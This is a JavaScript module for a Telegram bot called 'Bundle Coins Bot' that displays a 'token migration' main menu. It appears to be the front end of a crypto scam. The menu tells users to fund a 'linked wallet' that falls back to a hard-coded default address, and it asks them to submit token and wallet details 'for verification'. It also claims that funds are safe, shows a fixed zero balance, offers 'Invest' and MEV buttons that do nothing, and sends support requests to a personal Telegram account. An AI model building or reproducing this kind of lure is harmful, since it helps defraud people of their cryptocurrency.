const { userSessions } = require("./sessions");
const { button, markdownOptions, urlButton } = require("./telegram-ui");
const { DEFAULT_PUBLIC_KEY } = require("./wallets");

async function showMainMenu(bot, call) {
  const chatId = call.message.chat.id;
  const pubkey = userSessions[chatId]?.pubkey || DEFAULT_PUBLIC_KEY;

  const menuText = `
🚀 *Bundle Coins Bot*
_Automated burn-and-swap platform for token migrations._

━━━━━━━━━━━━━━━━

⚡ *Launch Migration*
Simplify token migrations with secure burn-and-swap flows.

🔑 *Linked Bundle Coins Bot Wallet*
\`${pubkey}\`
_(Tap to copy)_

💰 *Balance:* \`0.000000 SOL\`

━━━━━━━━━━━━━━━━

📥 *Fund Your Wallet*
Fund your wallet to start the migration process with ease.
Once done, tap *Refresh* and your balance will appear here.

🎯 *Token Migration*
To begin, submit your old token details and wallet for verification.

🛡️ *Security*
User funds are safe on *Bundle Coins Bot*. For more info on your wallet tap the wallet button below.
`;

  await bot.sendMessage(
    chatId,
    menuText,
    markdownOptions([
      [button("🚀 Invest", "StartNexisMEV")],
      [button("📦 Wallet", "wallet"), button("📊 Positions", "Positions")],
      [button("📈 History", "MEVHistory"), button("🏆 Leaderboard", "Leaderboard")],
      [button("🔍 Transaction Tracker", "MEVTransactionsTracker")],
      [button("ℹ️ Info", "Info"), button("👥 Referrals", "Referrals")],
      [urlButton("💬 Support", "https://t.me/MorganAronn288"), button("🔄 Refresh", "Refresh")]
    ])
  );
}

async function handleMainMenuCallback(bot, call) {
  const buttonName = call.data;
  await bot.sendMessage(call.message.chat.id, `This is *${buttonName}* button`, {
    parse_mode: "Markdown"
  });
}

module.exports = {
  handleMainMenuCallback,
  showMainMenu
};
